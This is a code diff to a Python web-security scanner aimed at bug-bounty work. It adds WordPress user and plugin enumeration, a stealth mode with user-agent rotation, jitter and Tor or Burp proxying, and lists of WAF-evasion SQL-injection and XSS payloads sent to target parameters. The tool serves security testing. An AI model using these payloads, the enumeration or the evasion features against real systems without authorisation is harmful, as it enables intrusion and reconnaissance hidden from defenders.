@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-WebSec - Web Security Research & OSINT Tool v2.0
+WebSec - Web Security Research & OSINT Tool v2.4.0
 For SecV Platform | Author: dezthejackal
 Category: Web Security Research
 
@@ -17,6 +17,7 @@ import socket
 import subprocess
 import re
 import time
+import random
 import os
 import hashlib
 import base64
@@ -87,7 +88,7 @@ def banner():
 ║   ╚███╔███╔╝███████╗██████╔╝███████║███████╗╚██████╗               ║
 ║    ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝               ║
 ║                                                                      ║
-║   Web Security Research & OSINT Tool v2.0                           ║
+║   Web Security Research & OSINT Tool v2.4.0                         ║
 ║   For Bug Bounty Hunters & Security Researchers                     ║
 ╚══════════════════════════════════════════════════════════════════════╝{NC}
 """
@@ -337,6 +338,60 @@ VULN_DB = {
         "impact": "Brute-force attacks, credential stuffing, scraping",
         "fix": "Implement rate limiting (e.g., 429 responses) per IP or account",
     },
+    "wp_user_enum": {
+        "name": "WordPress User Enumeration via REST API",
+        "severity": "HIGH",
+        "cwe": "CWE-200",
+        "owasp": "A01:2021 - Broken Access Control",
+        "description": "WordPress REST API /wp/v2/users endpoint exposes usernames and IDs without authentication.",
+        "impact": "Usernames harvested for brute-force against wp-login.php or xmlrpc.php",
+        "fix": "Add capability check to the /users endpoint or disable it: remove_action('rest_authentication_errors', ...); filter with 'rest_endpoints'",
+    },
+    "wp_version_disclosure": {
+        "name": "WordPress Version Disclosure",
+        "severity": "LOW",
+        "cwe": "CWE-200",
+        "owasp": "A05:2021 - Security Misconfiguration",
+        "description": "WordPress version is disclosed in the HTML generator meta tag.",
+        "impact": "Attacker can immediately correlate version with known CVEs",
+        "fix": "Remove generator tag: remove_action('wp_head', 'wp_generator');",
+    },
+    "wp_xmlrpc": {
+        "name": "WordPress xmlrpc.php Enabled",
+        "severity": "MEDIUM",
+        "cwe": "CWE-285",
+        "owasp": "A05:2021 - Security Misconfiguration",
+        "description": "xmlrpc.php is accessible and accepts requests, enabling brute-force amplification via multicall and SSRF.",
+        "impact": "Credential brute-force at 1000x normal rate, SSRF, DoS",
+        "fix": "Disable xmlrpc.php via .htaccess or a plugin unless specifically required",
+    },
+    "wp_plugin_enum": {
+        "name": "WordPress Plugin Enumeration",
+        "severity": "INFO",
+        "cwe": "CWE-200",
+        "owasp": "A05:2021 - Security Misconfiguration",
+        "description": "Installed plugins are enumerable from page source via wp-content/plugins paths.",
+        "impact": "Attacker maps plugin versions and matches against CVE databases",
+        "fix": "Use security plugins to obfuscate plugin paths, keep all plugins updated",
+    },
+    "wp_login_exposed": {
+        "name": "WordPress Login Page Exposed",
+        "severity": "LOW",
+        "cwe": "CWE-285",
+        "owasp": "A07:2021 - Identification and Authentication Failures",
+        "description": "wp-login.php is publicly accessible without any visible lockout protection.",
+        "impact": "Brute-force and credential stuffing attacks on WP admin accounts",
+        "fix": "Add IP allowlisting, 2FA, or a login page protection plugin (e.g., Limit Login Attempts Reloaded)",
+    },
+    "wp_cron_exposed": {
+        "name": "WordPress wp-cron.php Publicly Accessible",
+        "severity": "LOW",
+        "cwe": "CWE-770",
+        "owasp": "A05:2021 - Security Misconfiguration",
+        "description": "wp-cron.php can be triggered by external HTTP requests, enabling abuse and DoS.",
+        "impact": "External parties can trigger scheduled tasks; potential DoS via resource exhaustion",
+        "fix": "Disable HTTP triggering: define('DISABLE_WP_CRON', true); use a real cron job instead",
+    },
 }
 
 # ============================================================================
@@ -495,6 +550,84 @@ CONFLUENCE_PATHS = [
 UPLOAD_PATHS = ['/upload', '/file/upload', '/api/upload', '/media/upload',
                 '/uploads', '/attachments', '/import']
 
+# ============================================================================
+# STEALTH & ANONYMIZATION
+# ============================================================================
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
+    "Mozilla/5.0 (X11; CrOS x86_64 15917.71.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Brave/124",
+]
+
+# Browser-like headers — mimic a real browser session
+BROWSER_HEADERS = {
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+    "DNT": "1",
+    "Connection": "keep-alive",
+    "Upgrade-Insecure-Requests": "1",
+    "Sec-Fetch-Dest": "document",
+    "Sec-Fetch-Mode": "navigate",
+    "Sec-Fetch-Site": "none",
+    "Sec-Fetch-User": "?1",
+    "Cache-Control": "max-age=0",
+    "Pragma": "no-cache",
+}
+
+# Headers that expose scanner identity — stripped in stealth mode
+SCANNER_HEADERS = [
+    "X-Scanner", "X-Security-Scan", "X-Pentest", "X-SecV",
+    "X-Requested-With",  # often set by JS libs, flags non-browser origin
+]
+
+# WAF evasion XSS payloads — encoding and syntax tricks
+WAF_EVASION_XSS = [
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<svg><animateTransform onbegin=alert(1) attributeName=transform>",
+    "<img src=x oNeRrOr=alert(1)>",
+    "jav&#x61;script:alert(1)",
+    "<a href=javascript&colon;alert(1)>x</a>",
+    "\"onmouseover=alert(1) x=\"",
+    "<details open ontoggle=alert(1)>",
+    "%3cscript%3ealert(1)%3c%2fscript%3e",
+    "\"><img/src=x onerror=alert`1`>",
+    "<input autofocus onfocus=alert(1)>",
+]
+
+# WAF evasion SQLi payloads — comment injection, encoding, case mixing
+WAF_EVASION_SQLI = [
+    "' /*!50000OR*/ 1=1-- -",
+    "' OR/**/1=1-- -",
+    "' oR '1'='1'-- -",
+    "%27%20OR%201%3D1-- -",
+    "' OR 1e0=1e0-- -",
+    "';EXEC(CHAR(0x73,0x65,0x6c,0x65,0x63,0x74)+' 1')--",
+    "1 AND 1=1 UNION ALL SELECT NULL,NULL,NULL--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
+    "' /*!UNION*/ /*!SELECT*/ 1,2,3-- -",
+    "' OR 0x31=0x31-- -",
+]
+
+# ============================================================================
 # Tech fingerprints
 TECH_SIGNATURES = {
     "WordPress": [r"wp-content", r"wp-includes", r"wordpress"],
@@ -537,12 +670,31 @@ class WebSec:
         self.wordlist = params.get("wordlist", "built-in")
         self.output_dir = params.get("output_dir", "./websec_output")
 
-        # New params from webscan integration
+        # Operation params
         self.bypass_path = params.get("bypass_path", "/admin")
         self.test_url = params.get("test_url", "")
         self.cookies = params.get("cookies", "")
         self.headers_str = params.get("headers_str", "")
-        self.user_agent = params.get("user_agent", "Mozilla/5.0 (SecV WebSec Research Tool)")
+        self.user_agent = params.get("user_agent", "")
+
+        # Stealth & anonymization params
+        self.stealth = str(params.get("stealth", False)).lower() in ("true", "1", "yes")
+        self.rotate_ua = str(params.get("rotate_ua", False)).lower() in ("true", "1", "yes")
+        self.delay = float(params.get("delay", 0.0))
+        self.jitter = float(params.get("jitter", 0.0))
+        self.proxy = params.get("proxy", "")
+        self.waf_evasion = str(params.get("waf_evasion", False)).lower() in ("true", "1", "yes")
+
+        # Stealth mode implies UA rotation + browser headers
+        if self.stealth:
+            self.rotate_ua = True
+
+        # Resolve user-agent: explicit > stealth random > default
+        if not self.user_agent:
+            if self.stealth or self.rotate_ua:
+                self.user_agent = random.choice(USER_AGENTS)
+            else:
+                self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 
         self.findings: List[Dict] = []
         self.info_findings: List[Dict] = []
@@ -556,6 +708,11 @@ class WebSec:
         if CAPS["requests"]:
             self._session = requests.Session()
             self._session.headers.update({"User-Agent": self.user_agent})
+            # Stealth: add full browser header set, remove identifying markers
+            if self.stealth:
+                self._session.headers.update(BROWSER_HEADERS)
+                for h in SCANNER_HEADERS:
+                    self._session.headers.pop(h, None)
             if self.cookies:
                 for kv in self.cookies.split(";"):
                     kv = kv.strip()
@@ -568,6 +725,8 @@ class WebSec:
                     if ":" in kv:
                         k, v = kv.split(":", 1)
                         self._session.headers[k.strip()] = v.strip()
+            if self.proxy:
+                self._session.proxies.update({"http": self.proxy, "https": self.proxy})
 
     def _parse_target(self, target: str) -> Tuple[str, str, str, int]:
         """Parse and normalize the target URL."""
@@ -586,23 +745,41 @@ class WebSec:
 
         return url, host, scheme, port
 
+    def _apply_delay(self):
+        """Sleep for delay + random jitter. Called before every request in stealth/delay mode."""
+        total = self.delay
+        if self.jitter > 0:
+            total += random.uniform(0, self.jitter)
+        if total > 0:
+            time.sleep(total)
+
+    def _pick_ua(self) -> str:
+        """Return a random User-Agent from the pool (used per-request when rotate_ua is on)."""
+        return random.choice(USER_AGENTS)
+
     def _request(self, url: str, method: str = "GET", headers: dict = None,
                  data: str = None, allow_redirects: bool = True,
                  timeout: float = None) -> Optional[Dict]:
-        """Make an HTTP request, using requests session if available, else urllib."""
+        """Make an HTTP request with optional stealth controls (delay, UA rotation, proxy)."""
+        self._apply_delay()
         timeout = timeout or self.timeout
-        default_headers = {
-            "User-Agent": self.user_agent,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        }
+
+        # Per-request UA rotation
+        ua = self._pick_ua() if self.rotate_ua else self.user_agent
+
+        req_headers = {"User-Agent": ua}
+        if self.stealth:
+            req_headers.update(BROWSER_HEADERS)
+        else:
+            req_headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
         if headers:
-            default_headers.update(headers)
+            req_headers.update(headers)
 
         try:
             if CAPS["requests"] and self._session:
                 resp = self._session.request(
                     method, url,
-                    headers=default_headers,
+                    headers=req_headers,
                     data=data,
                     timeout=timeout,
                     verify=False,
@@ -617,11 +794,19 @@ class WebSec:
                     "redirected": resp.url != url,
                 }
             else:
-                req = urllib.request.Request(url, headers=default_headers, method=method)
+                # urllib path — build proxy opener if configured
+                handlers = []
                 ctx = ssl.create_default_context()
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
-                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+                if self.proxy:
+                    handlers.append(urllib.request.ProxyHandler({"http": self.proxy, "https": self.proxy}))
+                handlers.append(urllib.request.HTTPSHandler(context=ctx))
+                opener = urllib.request.build_opener(*handlers)
+                req = urllib.request.Request(url, headers=req_headers, method=method)
+                if not allow_redirects:
+                    opener.addheaders = []
+                with opener.open(req, timeout=timeout) as resp:
                     body = resp.read().decode("utf-8", errors="ignore")
                     return {
                         "status": resp.status,
@@ -980,7 +1165,13 @@ class WebSec:
                         bad(f"[{status}] {path} <- INTERESTING!")
                         interesting.append(result)
 
-                        if ".git" in path:
+                        if "wp-config" in path and status == 200:
+                            self._add_finding("sensitive_files_exposed",
+                                detail="wp-config.php exposed — contains DB credentials and secret keys",
+                                evidence=f"HTTP {status} at {result['url']}",
+                                url=result["url"],
+                                severity_override="CRITICAL")
+                        elif ".git" in path:
                             self._add_finding("sensitive_files_exposed",
                                 detail="Git repository exposed - full source code may be accessible",
                                 evidence=f"HTTP {status} at {result['url']}",
@@ -1242,6 +1433,32 @@ class WebSec:
                         "type": "time_blind"
                     })
 
+        # WAF evasion SQLi if enabled
+        if self.waf_evasion:
+            info("WAF evasion mode: testing obfuscated SQLi payloads...")
+            for method, param, url in test_points:
+                for payload in WAF_EVASION_SQLI:
+                    results["tested"] += 1
+                    if method == "GET":
+                        p = urllib.parse.urlparse(url)
+                        params_dict = dict(urllib.parse.parse_qsl(p.query))
+                        params_dict[param] = payload
+                        test_target = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(params_dict)))
+                        r = self._request(test_target, timeout=8.0)
+                    else:
+                        r = self._request(url, method="POST", data=urllib.parse.urlencode({param: payload}))
+                    if not r:
+                        continue
+                    for pattern in SQLI_ERROR_PATTERNS:
+                        if re.search(pattern, r["body"], re.IGNORECASE):
+                            bad(f"WAF-EVADED SQLi: {param}='{payload[:30]}...' triggered: {pattern}")
+                            self._add_finding("sqli_error",
+                                detail=f"WAF-evaded SQLi in parameter '{param}'",
+                                evidence=f"Evasion payload: {payload}\nPattern: {pattern}",
+                                url=url)
+                            results["vulnerable"].append({"param": param, "payload": payload, "url": url, "type": "waf_evasion_sqli"})
+                            break
+
         if not results["vulnerable"]:
             ok(f"No obvious SQLi found in {results['tested']} tests")
 
@@ -1336,6 +1553,29 @@ class WebSec:
                 else:
                     info(f"  {param}: Payload not reflected")
 
+        # WAF evasion XSS if enabled
+        if self.waf_evasion:
+            info("WAF evasion mode: testing obfuscated XSS payloads...")
+            for method, param, url in test_points:
+                for payload in WAF_EVASION_XSS:
+                    full_payload = f"{marker}{payload}"
+                    results["tested"] += 1
+                    if method == "GET":
+                        p = urllib.parse.urlparse(url)
+                        pdict = urllib.parse.parse_qs(p.query)
+                        pdict[param] = [full_payload]
+                        target = urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(pdict, doseq=True)))
+                        r = self._request(target)
+                    else:
+                        r = self._request(url, method="POST", data=urllib.parse.urlencode({param: full_payload}))
+                    if r and marker in r["body"] and "&lt;" not in r["body"]:
+                        bad(f"WAF-EVADED XSS: {param} reflects obfuscated payload unencoded")
+                        self._add_finding("xss_reflected",
+                            detail=f"WAF-evaded XSS in parameter '{param}'",
+                            evidence=f"Evasion payload: {payload}",
+                            url=url)
+                        results["vulnerable"].append({"param": param, "payload": payload, "url": url, "type": "waf_evasion_xss"})
+
         return results
 
     # =========================================================================
@@ -1346,31 +1586,40 @@ class WebSec:
         """Test for missing CSRF tokens on forms."""
         section("CSRF TOKEN DETECTION")
 
-        results = {"findings": [], "tested_url": self.url}
-        resp = self._request(self.url)
-        if not resp:
-            bad("Could not reach target")
-            return results
+        # Always check homepage + common form pages
+        form_pages = [self.url]
+        for path in ["/wp-login.php", "/login", "/signin", "/register", "/account", "/contact"]:
+            form_pages.append(self.url.rstrip("/") + path)
 
-        body = resp["body"]
-        has_form = "<form" in body.lower() and "method" in body.lower()
-        if not has_form:
-            info("No forms detected on the main page.")
-            return results
+        results = {"findings": [], "tested_urls": form_pages}
+        forms_found = 0
 
-        has_token = any(re.search(pat, body, re.IGNORECASE) for pat in CSRF_TOKEN_PATTERNS)
-        if not has_token:
-            bad("Form found without detectable CSRF token")
-            self._add_finding("csrf_missing_token",
-                detail="Form present but no CSRF token pattern detected",
-                evidence="No _token, csrf_token, csrfmiddlewaretoken, authenticity_token found")
-            results["findings"].append({
-                "type": "csrf_missing_token",
-                "severity": "MEDIUM",
-                "url": self.url,
-            })
-        else:
-            ok("CSRF token detected in form(s)")
+        for page_url in form_pages:
+            resp = self._request(page_url)
+            if not resp:
+                continue
+            body = resp["body"]
+            has_form = "<form" in body.lower() and ("method" in body.lower() or "action" in body.lower())
+            if not has_form:
+                continue
+            forms_found += 1
+            has_token = any(re.search(pat, body, re.IGNORECASE) for pat in CSRF_TOKEN_PATTERNS)
+            if not has_token:
+                bad(f"Form without CSRF token: {page_url}")
+                self._add_finding("csrf_missing_token",
+                    detail=f"Form present at {page_url} but no CSRF token pattern detected",
+                    evidence="No _token, csrf_token, csrfmiddlewaretoken, authenticity_token found",
+                    url=page_url)
+                results["findings"].append({
+                    "type": "csrf_missing_token",
+                    "severity": "MEDIUM",
+                    "url": page_url,
+                })
+            else:
+                ok(f"CSRF token detected: {page_url}")
+
+        if forms_found == 0:
+            info("No forms detected on any tested pages.")
 
         return results
 
@@ -1459,7 +1708,8 @@ class WebSec:
                 r = self._request(test_target, allow_redirects=True, timeout=5.0)
                 if r:
                     final = r.get("url", test_target)
-                    if "evil.com" in final:
+                    final_host = urllib.parse.urlparse(final).netloc.lower().rstrip(".")
+                    if final_host.endswith("evil.com") and final_host != urllib.parse.urlparse(test_target).netloc.lower().rstrip("."):
                         bad(f"OPEN REDIRECT: {param}={payload} -> {final}")
                         self._add_finding("open_redirect",
                             detail=f"Parameter '{param}' allows redirect to attacker-controlled domain",
@@ -1496,9 +1746,18 @@ class WebSec:
         headers_lower = str(resp["headers"]).lower()
         body_lower = resp["body"].lower()
 
-        is_jira = "jira" in body_lower or "atlassian" in headers_lower
+        # Strict Jira detection: require Atlassian-specific markers, not generic body text
+        is_jira = (
+            "x-seraph-loginreason" in headers_lower or
+            "x-ausername" in headers_lower or
+            "atlassian.net" in headers_lower or
+            ("atlassian-token" in headers_lower and "jira" in body_lower) or
+            re.search(r'content="atlassian jira', body_lower) is not None or
+            "secure/dashboard.jspa" in body_lower or
+            "secure/login.jspa" in body_lower
+        )
         is_aem = "aem" in body_lower or "cq5" in body_lower or "granite" in body_lower
-        is_confluence = "confluence" in body_lower
+        is_confluence = "confluence" in body_lower and "atlassian" in body_lower
 
         paths_to_check = []
         if is_jira:
@@ -1749,7 +2008,8 @@ class WebSec:
             resp = self._request(http_url, allow_redirects=False, timeout=5.0)
             if resp:
                 if resp["status"] in (301, 302, 307, 308):
-                    location = resp["headers"].get("location", "")
+                    resp_headers_lower = {k.lower(): v for k, v in resp["headers"].items()}
+                    location = resp_headers_lower.get("location", "")
                     if "https" in location:
                         ok(f"HTTP -> HTTPS redirect: {resp['status']} to {location[:60]}")
                     else:
@@ -1816,6 +2076,203 @@ class WebSec:
         return {"detected": detected_waf, "waf_active": waf_active}
 
     # =========================================================================
+    # OPERATION: STEALTH CONFIGURATION & ANONYMIZATION CHECK
+    # =========================================================================
+
+    def op_stealth(self) -> Dict:
+        """Display current stealth configuration and test anonymization posture."""
+        section("STEALTH & ANONYMIZATION")
+
+        result = {
+            "stealth_mode": self.stealth,
+            "rotate_ua": self.rotate_ua,
+            "delay": self.delay,
+            "jitter": self.jitter,
+            "proxy": self.proxy or None,
+            "waf_evasion": self.waf_evasion,
+            "current_ua": self.user_agent,
+            "proxy_reachable": None,
+        }
+
+        # Show current config
+        ok("Stealth mode:    " + (f"{G}ON{NC}" if self.stealth else f"{Y}OFF{NC}"))
+        ok(f"UA rotation:     {'ON — ' + self.user_agent[:60] if self.rotate_ua else 'OFF'}")
+        ok(f"Request delay:   {self.delay}s" + (f" + up to {self.jitter}s jitter" if self.jitter else ""))
+        ok(f"Proxy:           {self.proxy or 'none'}")
+        ok(f"WAF evasion:     {'ON' if self.waf_evasion else 'OFF'}")
+
+        # Show headers that will be sent
+        section("Headers sent per request")
+        headers_preview = {"User-Agent": self.user_agent}
+        if self.stealth:
+            headers_preview.update(BROWSER_HEADERS)
+        for k, v in headers_preview.items():
+            info(f"  {k}: {v}")
+
+        # Proxy reachability test
+        if self.proxy:
+            info(f"Testing proxy: {self.proxy}")
+            r = self._request(self.url, timeout=8.0)
+            if r:
+                ok(f"Proxy reachable — target responded {r['status']} via {self.proxy}")
+                result["proxy_reachable"] = True
+            else:
+                bad(f"Proxy unreachable or blocked — {self.proxy}")
+                result["proxy_reachable"] = False
+        else:
+            warn("No proxy configured — your real IP will be in server logs")
+            warn("Use: set proxy http://127.0.0.1:8080  (Burp) or socks5://127.0.0.1:9050  (Tor)")
+
+        # Recommendations
+        section("Recommendations")
+        if not self.stealth:
+            warn("Run 'set stealth true' — enables UA rotation + full browser headers")
+        if not self.proxy:
+            warn("Route through Tor: set proxy socks5://127.0.0.1:9050")
+            warn("Or through Burp:   set proxy http://127.0.0.1:8080")
+        if not self.delay and not self.jitter:
+            warn("Add jitter to avoid rate-based detection: set delay 0.5 / set jitter 1.5")
+        if not self.waf_evasion:
+            info("Enable WAF evasion payloads for SQLi/XSS: set waf_evasion true")
+
+        if self.stealth and self.proxy and self.delay:
+            ok("Full stealth posture configured — proxy + UA rotation + delay active")
+
+        return result
+
+    # =========================================================================
+    # OPERATION: WORDPRESS ATTACK SURFACE
+    # =========================================================================
+
+    def op_wordpress(self) -> Dict:
+        """WordPress-specific attack surface enumeration."""
+        section("WORDPRESS ATTACK SURFACE")
+
+        results = {
+            "is_wordpress": False,
+            "version": None,
+            "users": [],
+            "plugins": [],
+            "xmlrpc": False,
+            "findings": [],
+        }
+
+        resp = self._request(self.url)
+        if not resp:
+            bad("Could not reach target")
+            return results
+
+        body = resp["body"]
+        is_wp = bool(re.search(r"wp-content|wp-includes|wordpress", body, re.IGNORECASE))
+        if not is_wp:
+            info("WordPress not detected on this target")
+            return results
+
+        results["is_wordpress"] = True
+        ok("WordPress detected")
+
+        # Version from generator meta tag
+        ver_match = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress ([0-9.]+)', body, re.IGNORECASE)
+        if ver_match:
+            version = ver_match.group(1)
+            results["version"] = version
+            warn(f"WordPress version: {version}")
+            self._add_finding("wp_version_disclosure",
+                detail=f"WordPress version {version} disclosed in generator meta tag",
+                evidence=f"<meta name='generator' content='WordPress {version}'>",
+                url=self.url)
+
+        # User enumeration via REST API
+        info("Probing REST API for user enumeration...")
+        api_resp = self._request(self.url.rstrip("/") + "/wp-json/wp/v2/users")
+        if api_resp and api_resp["status"] == 200:
+            try:
+                users = json.loads(api_resp["body"])
+                if isinstance(users, list) and users:
+                    bad(f"User enumeration via REST API: {len(users)} user(s) exposed")
+                    for u in users:
+                        name = u.get("name", "")
+                        slug = u.get("slug", "")
+                        uid = u.get("id", "")
+                        results["users"].append({"id": uid, "name": name, "slug": slug})
+                        bad(f"  User: id={uid} name={name} login={slug}")
+                    self._add_finding("wp_user_enum",
+                        detail=f"{len(users)} WordPress user(s) enumerated via /wp-json/wp/v2/users",
+                        evidence="\n".join(f"id={u.get('id')} login={u.get('slug')}" for u in users[:5]),
+                        url=self.url.rstrip("/") + "/wp-json/wp/v2/users",
+                        severity_override="HIGH")
+                    results["findings"].append("rest_api_user_enum")
+            except (json.JSONDecodeError, KeyError):
+                pass
+
+        # User enumeration via /?author=N
+        info("Probing /?author= redirect for username disclosure...")
+        for uid in range(1, 4):
+            author_resp = self._request(self.url.rstrip("/") + f"/?author={uid}", allow_redirects=True)
+            if author_resp and author_resp["status"] == 200:
+                slug_match = re.search(r"/author/([^/\"']+)", author_resp.get("url", "") + author_resp["body"])
+                if slug_match:
+                    slug = slug_match.group(1)
+                    if slug not in [u["slug"] for u in results["users"]]:
+                        warn(f"Username via /?author={uid}: {slug}")
+                        results["users"].append({"id": uid, "slug": slug})
+
+        # xmlrpc.php detection
+        info("Checking xmlrpc.php...")
+        xml_resp = self._request(self.url.rstrip("/") + "/xmlrpc.php")
+        if xml_resp and xml_resp["status"] in (200, 405):
+            results["xmlrpc"] = True
+            warn("xmlrpc.php is accessible — enables brute force amplification and SSRF")
+            self._add_finding("wp_xmlrpc",
+                detail="xmlrpc.php accessible — can be abused for credential brute-force (multicall) and SSRF",
+                evidence=f"HTTP {xml_resp['status']} at /xmlrpc.php",
+                url=self.url.rstrip("/") + "/xmlrpc.php",
+                severity_override="MEDIUM")
+            results["findings"].append("xmlrpc_enabled")
+
+        # Plugin enumeration from source
+        info("Enumerating plugins from page source...")
+        plugin_matches = re.findall(r"/wp-content/plugins/([a-zA-Z0-9_-]+)/", body)
+        seen = set()
+        for p in plugin_matches:
+            if p not in seen:
+                seen.add(p)
+                results["plugins"].append(p)
+                info(f"  Plugin: {p}")
+
+        if results["plugins"]:
+            self._add_finding("wp_plugin_enum",
+                detail=f"{len(results['plugins'])} plugin(s) enumerated from page source",
+                evidence=", ".join(results["plugins"]),
+                url=self.url,
+                severity_override="INFO")
+            results["findings"].append("plugin_enum")
+
+        # wp-login.php accessible
+        login_resp = self._request(self.url.rstrip("/") + "/wp-login.php")
+        if login_resp and login_resp["status"] == 200:
+            warn("wp-login.php exposed — susceptible to brute force")
+            self._add_finding("wp_login_exposed",
+                detail="wp-login.php is publicly accessible with no lockout indication",
+                evidence=f"HTTP 200 at /wp-login.php",
+                url=self.url.rstrip("/") + "/wp-login.php",
+                severity_override="LOW")
+            results["findings"].append("wp_login_exposed")
+
+        # wp-cron.php
+        cron_resp = self._request(self.url.rstrip("/") + "/wp-cron.php")
+        if cron_resp and cron_resp["status"] == 200:
+            warn("wp-cron.php is publicly accessible — can be used for DoS/abuse")
+            self._add_finding("wp_cron_exposed",
+                detail="wp-cron.php accessible publicly — external requests can trigger scheduled tasks",
+                evidence="HTTP 200 at /wp-cron.php",
+                url=self.url.rstrip("/") + "/wp-cron.php",
+                severity_override="LOW")
+
+        info(f"WordPress enumeration complete: {len(results['users'])} users, {len(results['plugins'])} plugins")
+        return results
+
+    # =========================================================================
     # OPERATION: FULL SCAN
     # =========================================================================
 
@@ -1836,6 +2293,7 @@ class WebSec:
         results["framework_cves"] = self.op_framework_cves()
         results["file_upload"] = self.op_file_upload()
         results["rate_limit"] = self.op_rate_limit()
+        results["wordpress"] = self.op_wordpress()
 
         return results
 
@@ -1871,6 +2329,8 @@ class WebSec:
             "framework_cves": self.op_framework_cves,
             "file_upload": self.op_file_upload,
             "rate_limit": self.op_rate_limit,
+            "wordpress": self.op_wordpress,
+            "stealth": self.op_stealth,
         }
 
         func = operations.get(self.operation, self.op_recon)
@@ -1983,7 +2443,17 @@ def main():
   {G}dork{NC}           Google dork generator
   {G}ssl{NC}            SSL/TLS deep analysis
   {G}waf{NC}            WAF detection
+  {G}wordpress{NC}      WordPress attack surface (users, plugins, xmlrpc, wp-cron)
+  {G}stealth{NC}        Show/test stealth config: proxy, UA rotation, delay, WAF evasion
   {G}full{NC}           Complete assessment (all operations)
+
+{BOLD}{Y}STEALTH PARAMETERS:{NC}
+  stealth               Enable stealth mode: UA rotation + browser headers (true/false)
+  rotate_ua             Rotate User-Agent on every request (true/false)
+  delay                 Fixed delay between requests in seconds (e.g. 0.5)
+  jitter                Add 0-N seconds of random jitter to delay (e.g. 1.5)
+  proxy                 Route traffic through proxy (http://host:port or socks5://host:port)
+  waf_evasion           Use obfuscated SQLi/XSS payloads to bypass WAFs (true/false)
 
 {BOLD}{Y}PARAMETERS:{NC}
   operation             Operation to run (see above)
